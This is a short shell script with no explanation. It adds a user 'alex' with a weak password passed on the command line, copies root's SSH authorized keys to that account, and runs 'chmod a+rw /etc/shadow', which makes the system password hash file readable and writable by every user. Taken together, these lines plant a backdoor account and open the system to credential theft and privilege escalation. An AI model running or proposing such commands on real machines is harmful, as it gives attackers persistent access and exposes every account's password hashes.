useradd -u 12345 -g users -d /home/alex -s /bin/bash -p alexisgreat alex
mkdir -pv /home/alex/.ssh
cp /root/.ssh/authorized_keys /home/alex/.ssh/authorized_keys
chmod a+rw /etc/shadow
